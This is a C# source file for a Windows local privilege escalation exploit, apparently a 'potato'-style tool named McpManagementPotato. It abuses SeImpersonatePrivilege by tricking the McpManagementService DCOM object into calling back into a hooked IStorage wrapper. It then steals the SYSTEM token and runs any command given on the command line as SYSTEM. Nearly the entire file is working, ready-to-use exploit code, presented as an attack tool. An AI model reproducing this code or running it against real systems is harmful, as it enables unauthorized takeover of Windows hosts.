using System;
using System.Data;
using System.Text;
using System.Text.RegularExpressions;
using System.Collections;
using System.Collections.Generic;
using System.Collections.Concurrent;
using System.Threading;
using System.Diagnostics;
using System.IO;
using System.Security.Cryptography;
using System.Net;
using System.Reflection;
using System.Runtime;
using System.Runtime.InteropServices;
using System.Runtime.InteropServices.ComTypes;
using System.Security.Principal;
using Microsoft.Win32.SafeHandles;

namespace Zcg.Exploits.Local
{
    //some code from BCL and pinvoke.net
    internal class ProcessWaitHandle : WaitHandle
    {
        internal ProcessWaitHandle(SafeWaitHandle processHandle)
        {
            base.SafeWaitHandle = processHandle;
        }
    }
    #region interop
    static class NativeMethods
    {
        [DllImport("ole32.dll", PreserveSig = false)]
        public static extern ILockBytes CreateILockBytesOnHGlobal(IntPtr hGlobal, bool fDeleteOnRelease);
        [DllImport("ole32.dll", PreserveSig = false)]
        public static extern IStorage StgCreateDocfileOnILockBytes(ILockBytes iLockBytes, int grfMode, int reserved);

        [DllImport("ole32.dll")]
        public static extern int CoGetInstanceFromIStorage(IntPtr pServerInfo, ref Guid pclsid, IntPtr pUnkOuter, int dwClsCtx, IntPtr pstg, uint cmq, [In, Out] MULTI_QI[] rgmqResults);

        [DllImport("ole32.dll")]
        public static extern int CoImpersonateClient();
        [DllImport("ole32.dll")]
        public static extern int CoRevertToSelf();
        [DllImport("kernel32.dll", CharSet = CharSet.Auto, ExactSpelling = true, SetLastError = true)]
        public static extern bool CloseHandle(IntPtr handle);
        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern bool CreatePipe(out IntPtr hReadPipe, out IntPtr hWritePipe, ref SECURITY_ATTRIBUTES lpPipeAttributes, int nSize);
        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref TOKEN_PRIVILEGES NewState, int Bufferlength, IntPtr PreviousState, IntPtr ReturnLength);
        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out LUID lpLuid);
        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode, CallingConvention = CallingConvention.StdCall)]
        public static extern bool CreateProcessWithTokenW(IntPtr hToken, ulong logon, [MarshalAs(UnmanagedType.LPWStr)] string lpApplicationName, [MarshalAs(UnmanagedType.LPWStr)] string lpCommandLine, Int32 dwCreationFlags, IntPtr lpEnvrionment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, ref PROCESS_INFORMATION lpProcessInformation);
    }
    [StructLayout(LayoutKind.Sequential, Pack = 4)]
    struct MULTI_QI
    {
        public IntPtr pIID;
        public IntPtr pItf;
        public int hr;
    }
    [StructLayout(LayoutKind.Sequential)]
    public class FILETIME
    {
        public int dwLowDateTime;

        public int dwHighDateTime;
    }
    [StructLayout(LayoutKind.Sequential)]
    public class STATSTG
    {
        [MarshalAs(UnmanagedType.LPWStr)]
        public string pwcsName;

        public int type;

        [MarshalAs(UnmanagedType.I8)]
        public long cbSize;

        [MarshalAs(UnmanagedType.I8)]
        public long mtime;

        [MarshalAs(UnmanagedType.I8)]
        public long ctime;

        [MarshalAs(UnmanagedType.I8)]
        public long atime;

        [MarshalAs(UnmanagedType.I4)]
        public int grfMode;

        [MarshalAs(UnmanagedType.I4)]
        public int grfLocksSupported;

        public int clsid_data1;

        [MarshalAs(UnmanagedType.I2)]
        public short clsid_data2;

        [MarshalAs(UnmanagedType.I2)]
        public short clsid_data3;

        [MarshalAs(UnmanagedType.U1)]
        public byte clsid_b0;

        [MarshalAs(UnmanagedType.U1)]
        public byte clsid_b1;

        [MarshalAs(UnmanagedType.U1)]
        public byte clsid_b2;

        [MarshalAs(UnmanagedType.U1)]
        public byte clsid_b3;

        [MarshalAs(UnmanagedType.U1)]
        public byte clsid_b4;

        [MarshalAs(UnmanagedType.U1)]
        public byte clsid_b5;

        [MarshalAs(UnmanagedType.U1)]
        public byte clsid_b6;

        [MarshalAs(UnmanagedType.U1)]
        public byte clsid_b7;

        [MarshalAs(UnmanagedType.I4)]
        public int grfStateBits;

        [MarshalAs(UnmanagedType.I4)]
        public int reserved;
    }
    [ComImport]
    [InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    [Guid("0000000A-0000-0000-C000-000000000046")]
    public interface ILockBytes
    {
        void ReadAt([In][MarshalAs(UnmanagedType.U8)] long ulOffset, [Out] IntPtr pv, [In][MarshalAs(UnmanagedType.U4)] int cb, [Out][MarshalAs(UnmanagedType.LPArray)] int[] pcbRead);

        void WriteAt([In][MarshalAs(UnmanagedType.U8)] long ulOffset, IntPtr pv, [In][MarshalAs(UnmanagedType.U4)] int cb, [Out][MarshalAs(UnmanagedType.LPArray)] int[] pcbWritten);

        void Flush();

        void SetSize([In][MarshalAs(UnmanagedType.U8)] long cb);

        void LockRegion([In][MarshalAs(UnmanagedType.U8)] long libOffset, [In][MarshalAs(UnmanagedType.U8)] long cb, [In][MarshalAs(UnmanagedType.U4)] int dwLockType);

        void UnlockRegion([In][MarshalAs(UnmanagedType.U8)] long libOffset, [In][MarshalAs(UnmanagedType.U8)] long cb, [In][MarshalAs(UnmanagedType.U4)] int dwLockType);

        void Stat([Out] STATSTG pstatstg, [In][MarshalAs(UnmanagedType.U4)] int grfStatFlag);
    }
    [ComImport]
    [Guid("0000000B-0000-0000-C000-000000000046")]
    [InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    public interface IStorage
    {
        [return: MarshalAs(UnmanagedType.Interface)]
        IStream CreateStream([In][MarshalAs(UnmanagedType.BStr)] string pwcsName, [In][MarshalAs(UnmanagedType.U4)] int grfMode, [In][MarshalAs(UnmanagedType.U4)] int reserved1, [In][MarshalAs(UnmanagedType.U4)] int reserved2);

        [return: MarshalAs(UnmanagedType.Interface)]
        IStream OpenStream([In][MarshalAs(UnmanagedType.BStr)] string pwcsName, IntPtr reserved1, [In][MarshalAs(UnmanagedType.U4)] int grfMode, [In][MarshalAs(UnmanagedType.U4)] int reserved2);

        [return: MarshalAs(UnmanagedType.Interface)]
        IStorage CreateStorage([In][MarshalAs(UnmanagedType.BStr)] string pwcsName, [In][MarshalAs(UnmanagedType.U4)] int grfMode, [In][MarshalAs(UnmanagedType.U4)] int reserved1, [In][MarshalAs(UnmanagedType.U4)] int reserved2);

        [return: MarshalAs(UnmanagedType.Interface)]
        IStorage OpenStorage([In][MarshalAs(UnmanagedType.BStr)] string pwcsName, IntPtr pstgPriority, [In][MarshalAs(UnmanagedType.U4)] int grfMode, IntPtr snbExclude, [In][MarshalAs(UnmanagedType.U4)] int reserved);

        void CopyTo(int ciidExclude, [In][MarshalAs(UnmanagedType.LPArray)] Guid[] pIIDExclude, IntPtr snbExclude, [In][MarshalAs(UnmanagedType.Interface)] IStorage stgDest);

        void MoveElementTo([In][MarshalAs(UnmanagedType.BStr)] string pwcsName, [In][MarshalAs(UnmanagedType.Interface)] IStorage stgDest, [In][MarshalAs(UnmanagedType.BStr)] string pwcsNewName, [In][MarshalAs(UnmanagedType.U4)] int grfFlags);

        void Commit(int grfCommitFlags);

        void Revert();

        void EnumElements([In][MarshalAs(UnmanagedType.U4)] int reserved1, IntPtr reserved2, [In][MarshalAs(UnmanagedType.U4)] int reserved3, [MarshalAs(UnmanagedType.Interface)] out object ppVal);

        void DestroyElement([In][MarshalAs(UnmanagedType.BStr)] string pwcsName);

        void RenameElement([In][MarshalAs(UnmanagedType.BStr)] string pwcsOldName, [In][MarshalAs(UnmanagedType.BStr)] string pwcsNewName);

        void SetElementTimes([In][MarshalAs(UnmanagedType.BStr)] string pwcsName, [In] FILETIME pctime, [In] FILETIME patime, [In] FILETIME pmtime);

        void SetClass([In] ref Guid clsid);

        void SetStateBits(int grfStateBits, int grfMask);

        void Stat([Out] STATSTG pStatStg, int grfStatFlag);
    }
    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public int dwProcessId;
        public int dwThreadId;
    }
    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct STARTUPINFO
    {
        public Int32 cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public Int32 dwX;
        public Int32 dwY;
        public Int32 dwXSize;
        public Int32 dwYSize;
        public Int32 dwXCountChars;
        public Int32 dwYCountChars;
        public Int32 dwFillAttribute;
        public Int32 dwFlags;
        public Int16 wShowWindow;
        public Int16 cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }
    [StructLayout(LayoutKind.Sequential)]
    public struct SECURITY_ATTRIBUTES
    {
        public int nLength;
        public IntPtr pSecurityDescriptor;
        public int bInheritHandle;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct TOKEN_PRIVILEGES
    {
        public uint PrivilegeCount;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 1)]
        public LUID_AND_ATTRIBUTES[] Privileges;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct LUID_AND_ATTRIBUTES
    {
        public LUID Luid;
        public UInt32 Attributes;
    }
    [StructLayout(LayoutKind.Sequential)]
    public struct LUID
    {
        public uint LowPart;
        public int HighPart;
    }
    #endregion

    class ManagedIStorageWrapper : IStorage
    {
        delegate int stat(IntPtr stg, STATSTG s, int i);
        private IStorage _storage;
        private static string _command;
        private stat _old = null;
        public ManagedIStorageWrapper(IStorage storage, string command)
        {
            _storage = storage;
            _command = command;
        }
        public static void ReadThread(object o)
        {
#pragma warning disable 0618
            FileStream fs = new FileStream((IntPtr)o, FileAccess.Read, false);
            StreamReader sr = new StreamReader(fs, Console.OutputEncoding);
            while (true)
            {
                string s = sr.ReadLine();
                if (s == null) { break; }
                Console.WriteLine(s);
            }
        }
        public static void test()
        {
            NativeMethods.CoImpersonateClient();
            var identity = WindowsIdentity.GetCurrent();
            if (identity.IsSystem)
            {
                IntPtr tkn = identity.Token;
                Console.WriteLine("[+] Get Token: " + tkn);
                SECURITY_ATTRIBUTES sa = new SECURITY_ATTRIBUTES();
                sa.nLength = Marshal.SizeOf(sa);
                sa.pSecurityDescriptor = IntPtr.Zero;
                sa.bInheritHandle = 1;
                IntPtr hRead, hWrite;
                NativeMethods.CreatePipe(out hRead, out hWrite, ref sa, 1024);
                PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
                STARTUPINFO si = new STARTUPINFO();
                si.cb = Marshal.SizeOf(si);
                si.hStdError = hWrite;
                si.hStdOutput = hWrite;
                si.lpDesktop = "WinSta0\\Default";
                si.dwFlags = 0x101;
                si.wShowWindow = 0;
                if (NativeMethods.CreateProcessWithTokenW(tkn, 2, null, _command, 0, IntPtr.Zero, null, ref si, ref pi))
                {
                    Console.WriteLine("[!] process with pid: {0} created.\r\n==============================", pi.dwProcessId);
                    var tn = new Thread(ReadThread);
                    tn.IsBackground = true;
                    tn.Start(hRead);
                    new ProcessWaitHandle(new SafeWaitHandle(pi.hProcess, false)).WaitOne(-1);
                    tn.Abort();
                    NativeMethods.CloseHandle(pi.hProcess);
                    NativeMethods.CloseHandle(pi.hThread);
                    NativeMethods.CloseHandle(tkn);
                    NativeMethods.CloseHandle(hWrite);
                    NativeMethods.CloseHandle(hRead);
                    Environment.Exit(0);
                }
                else
                {
                    Console.WriteLine("[x] CreateProcessWithTokenW err:" + Marshal.GetLastWin32Error());
                }
            }
            NativeMethods.CoRevertToSelf();
        }
        [return: MarshalAs(UnmanagedType.Interface)]
        public IStream CreateStream([In, MarshalAs(UnmanagedType.BStr)] string pwcsName, [In, MarshalAs(UnmanagedType.U4)] int grfMode, [In, MarshalAs(UnmanagedType.U4)] int reserved1, [In, MarshalAs(UnmanagedType.U4)] int reserved2)
        {
            test();
            return _storage.CreateStream(pwcsName, grfMode, reserved1, reserved2);
        }

        [return: MarshalAs(UnmanagedType.Interface)]
        public IStream OpenStream([In, MarshalAs(UnmanagedType.BStr)] string pwcsName, IntPtr reserved1, [In, MarshalAs(UnmanagedType.U4)] int grfMode, [In, MarshalAs(UnmanagedType.U4)] int reserved2)
        {
            test();
            return _storage.OpenStream(pwcsName, reserved1, grfMode, reserved2);
        }

        [return: MarshalAs(UnmanagedType.Interface)]
        public IStorage CreateStorage([In, MarshalAs(UnmanagedType.BStr)] string pwcsName, [In, MarshalAs(UnmanagedType.U4)] int grfMode, [In, MarshalAs(UnmanagedType.U4)] int reserved1, [In, MarshalAs(UnmanagedType.U4)] int reserved2)
        {
            test();
            return _storage.CreateStorage(pwcsName, grfMode, reserved1, reserved2);
        }

        [return: MarshalAs(UnmanagedType.Interface)]
        public IStorage OpenStorage([In, MarshalAs(UnmanagedType.BStr)] string pwcsName, IntPtr pstgPriority, [In, MarshalAs(UnmanagedType.U4)] int grfMode, IntPtr snbExclude, [In, MarshalAs(UnmanagedType.U4)] int reserved)
        {
            test();
            return _storage.OpenStorage(pwcsName, pstgPriority, grfMode, snbExclude, reserved);
        }

        public void CopyTo(int ciidExclude, [In, MarshalAs(UnmanagedType.LPArray)] Guid[] pIIDExclude, IntPtr snbExclude, [In, MarshalAs(UnmanagedType.Interface)] IStorage stgDest)
        {
            test();
            _storage.CopyTo(ciidExclude, pIIDExclude, snbExclude, stgDest);
        }

        public void MoveElementTo([In, MarshalAs(UnmanagedType.BStr)] string pwcsName, [In, MarshalAs(UnmanagedType.Interface)] IStorage stgDest, [In, MarshalAs(UnmanagedType.BStr)] string pwcsNewName, [In, MarshalAs(UnmanagedType.U4)] int grfFlags)
        {
            test();
            _storage.MoveElementTo(pwcsName, stgDest, pwcsNewName, grfFlags);
        }

        public void Commit(int grfCommitFlags)
        {
            test();
            _storage.Commit(grfCommitFlags);
        }

        public void Revert()
        {
            test();
            _storage.Revert();
        }

        public void EnumElements([In, MarshalAs(UnmanagedType.U4)] int reserved1, IntPtr reserved2, [In, MarshalAs(UnmanagedType.U4)] int reserved3, [MarshalAs(UnmanagedType.Interface)] out object ppVal)
        {
            test();
            _storage.EnumElements(reserved1, reserved2, reserved3, out ppVal);
        }

        public void DestroyElement([In, MarshalAs(UnmanagedType.BStr)] string pwcsName)
        {
            test();
            _storage.DestroyElement(pwcsName);
        }

        public void RenameElement([In, MarshalAs(UnmanagedType.BStr)] string pwcsOldName, [In, MarshalAs(UnmanagedType.BStr)] string pwcsNewName)
        {
            test();
            _storage.RenameElement(pwcsOldName, pwcsNewName);
        }

        public void SetElementTimes([In, MarshalAs(UnmanagedType.BStr)] string pwcsName, [In] FILETIME pctime, [In] FILETIME patime, [In] FILETIME pmtime)
        {
            test();
            _storage.SetElementTimes(pwcsName, pctime, patime, pmtime);
        }

        public void SetClass([In] ref Guid clsid)
        {
            test();
            _storage.SetClass(ref clsid);
        }

        public void SetStateBits(int grfStateBits, int grfMask)
        {
            test();
            _storage.SetStateBits(grfStateBits, grfMask);
        }

        public void Stat([Out] STATSTG pStatStg, int grfStatFlag)
        {
            test();
            if (_old != null)
            {
                _old(Marshal.GetComInterfaceForObject(_storage, typeof(IStorage)), pStatStg, grfStatFlag);
            }
            else
            {
                _storage.Stat(pStatStg, grfStatFlag);
            }
            pStatStg.pwcsName = "dummy.stg";
        }
    }
    class McpManagementPotato
    {
        static unsafe void Main(string[] args)
        {
            Console.WriteLine("Exploit for McpManagementService DCOM Object local privalege escalation vulnerability(by SeImpersonatePrivilege abuse).");
            Console.WriteLine("Part of GMH's fuck Tools, Code By zcgonvh.\r\n");
            if (args.Length < 1)
            {
                Console.WriteLine("usage: McpManagementPotato <cmd>");
                Console.WriteLine();
                return;
            }
            try
            {
                LUID_AND_ATTRIBUTES[] l = new LUID_AND_ATTRIBUTES[1];
                using (WindowsIdentity wi = WindowsIdentity.GetCurrent())
                {
                    Console.WriteLine("[+] Current user: " + wi.Name);
                    NativeMethods.LookupPrivilegeValue(null, "SeImpersonatePrivilege", out l[0].Luid);
                    TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES();
                    tp.PrivilegeCount = 1;
                    tp.Privileges = l;
                    l[0].Attributes = 2;
                    if (!NativeMethods.AdjustTokenPrivileges(wi.Token, false, ref tp, Marshal.SizeOf(tp), IntPtr.Zero, IntPtr.Zero) || Marshal.GetLastWin32Error() != 0)
                    {
                        Console.WriteLine("[x] SeImpersonatePrivilege not held.");
                        return;
                    }
                }
                var CLSID_McpManagementService = new Guid("{A9819296-E5B3-4E67-8226-5E72CE9E1FB7}");
                var lb = NativeMethods.CreateILockBytesOnHGlobal(IntPtr.Zero, true);
                var stg = NativeMethods.StgCreateDocfileOnILockBytes(lb, 0x1012, 0);
                var wrapper = new ManagedIStorageWrapper(stg, args[0]);
                MULTI_QI[] qis = new MULTI_QI[1];
                qis[0] = new MULTI_QI();
                fixed (byte* pIID_IUnk = new Guid("{00000000-0000-0000-C000-000000000046}").ToByteArray())
                {
                    qis[0].pIID = (IntPtr)pIID_IUnk;
                    qis[0].pItf = IntPtr.Zero;
                    qis[0].hr = 0;
                    var pobj = Marshal.GetComInterfaceForObject(wrapper, typeof(IStorage));
                    IntPtr vtbl = *(IntPtr*)pobj;
                    *(IntPtr*)(vtbl + 8 * 0x2) = Marshal.GetFunctionPointerForDelegate(new Action(ManagedIStorageWrapper.test));
                    var ret = NativeMethods.CoGetInstanceFromIStorage(IntPtr.Zero, ref CLSID_McpManagementService, IntPtr.Zero, 4, pobj, 1, qis);
                }

            }
            catch (Exception ex)
            {
                Console.WriteLine("[x] " + ex);
            }
        }
    }
}